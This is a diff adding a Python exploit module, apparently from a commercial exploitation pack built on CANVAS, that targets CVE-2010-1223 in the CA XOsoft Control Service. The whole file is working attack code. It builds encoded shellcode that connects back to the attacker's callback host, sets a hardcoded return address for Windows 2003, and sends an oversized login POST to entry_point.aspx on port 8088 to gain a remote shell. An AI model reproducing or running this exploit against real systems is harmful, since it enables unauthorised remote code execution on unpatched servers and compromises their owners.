@@ -1,0 +1,163 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+# GUI info
+NAME = "CA XOsoft Control Service entry_point.aspx Remote Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in CA XOsoft Control Service"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "CA"
+DOCUMENTATION["Repeatability"] = "One time"
+DOCUMENTATION["Date public"] = "2010.04.06"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-066/"
+DOCUMENTATION["Versions Affected"] = "CA XOsoft 12.0 / 12.5"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2010-1223"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1223"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2003 SP2 US (No NX)", 0x776934a8 ], # ptr on call esi @ user32.dll   
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 8088
+        self.ssl = 0
+        self.version = 0
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+      	      	      
+        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)
+
+        encoder         = alphanumeric.AlphaNum()
+        totopc          = encoder.seh_pc()
+        getpc           = encoder.get_pc(reg='ecx')
+        
+        payload         = encoder.encode(self.shellcode)
+        self.shellcode  = totopc + getpc + payload                    
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        
+        print sploitstring				        
+        self.websend(s, sploitstring)
+        buff = self.webrecv(1024)
+        print buff
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):							
+    	os_name, ptr = targets[self.version]
+
+    	ret = struct.pack('<L', ptr - 0x50)
+
+    	buff = "A"*6199 + ret + "A"*100 + self.shellcode + "B"*1000 + "\\" 
+    	data = "__EVENTTARGET=btn_login&__EVENTARGUMENT=0&__VIEWSTATE=&" 
+    	data += "txt_user_name=" + buff + "&txt_user_name_p=" + buff + "&txt_password=&txt_password_p=&txt_domain=&txt_domain_p=&btn_login__10=%3A0"    	    	    	    	
+			    	    	    		
+    	buff =  "POST /entry_point.aspx?width=1440 HTTP/1.0\r\n"
+    	buff += "Host: " + self.host + ":" + str(self.port) + "\r\n"    	    	
+    	buff += "Content-Type: application/x-www-form-urlencoded\r\n"
+    	buff += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n"    	
+    	buff += "Content-Length: " + str(len(data)) + "\r\n"
+    	buff += "\r\n"
+    	buff += data
+    	
+    	sploitstring = buff
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
